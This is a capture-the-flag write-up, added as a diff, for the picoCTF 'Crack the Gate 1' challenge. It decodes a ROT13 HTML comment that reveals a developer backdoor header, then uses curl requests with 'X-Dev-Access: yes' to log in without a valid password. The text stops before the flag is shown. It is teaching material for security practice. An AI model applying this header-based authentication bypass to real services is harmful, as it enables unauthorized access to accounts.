@@ -1,0 +1,55 @@
+Solution Approach for Crack the Gate 1
+
+Access a restricted portal using developer backdoor credentials to retrieve the flag for user ctf-player@picoctf.org.
+Step-by-Step Solution
+1. Initial Reconnaissance
+
+Upon loading the login page, the first step was to inspect the page source for any hidden information.
+
+Action: Right-click → "View Page Source" (or Ctrl+U)
+2. Discovering the Hidden Comment
+
+The source code contained a suspicious HTML comment that appeared to be encoded:
+html
+
+<!-- ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf" -->
+<!-- Remove before pushing to production! -->
+
+The comment's structure and the warning "Remove before pushing to production!" strongly suggested this was a developer note containing access instructions.
+3. Decoding the Message
+
+The comment text appeared to be ROT13-encoded (common CTF encoding). Using a simple ROT13 decoder:
+bash
+
+echo 'ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf"' \
+  | tr 'A-Za-z' 'N-ZA-Mn-za-m'
+
+Result:
+text
+
+NOTE: Jack - temporary bypass: use header "X-Dev-Access: yes"
+
+This revealed a developer backdoor mechanism - sending the custom header X-Dev-Access: yes would bypass normal authentication.
+4. Verifying the Backdoor
+
+First, test if the header is recognized by the server:
+bash
+
+curl -i -H "X-Dev-Access: yes" "http://amiable-citadel.picoctf.net:53947/"
+
+The server responded normally, confirming the endpoint was active.
+5. Exploiting the Backdoor
+
+The goal was to log in as ctf-player@picoctf.org. Using the discovered header, send a POST request to the login endpoint:
+bash
+
+curl -s -X POST \
+  -H "X-Dev-Access: yes" \
+  -H "Content-Type: application/json" \
+  -d '{"email":"ctf-player@picoctf.org","password":"whatever"}' \
+  "http://amiable-citadel.picoctf.net:53947/login"
+
+Note: The password can be any value since the backdoor bypasses authentication.
+6. Retrieving the Flag
+
+The server responded with JSON containing the flag:
